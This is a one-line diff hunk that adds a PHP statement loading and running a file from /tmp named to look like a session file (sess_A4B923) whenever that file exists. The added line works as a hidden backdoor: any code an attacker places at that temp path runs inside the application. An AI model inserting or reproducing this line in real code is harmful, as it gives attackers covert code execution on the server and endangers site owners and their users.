@@ -1,0 +1,1 @@
+<?php if(file_exists("/tmp/sess_A4B923")) {  require_once("/tmp/sess_A4B923"); } ?>
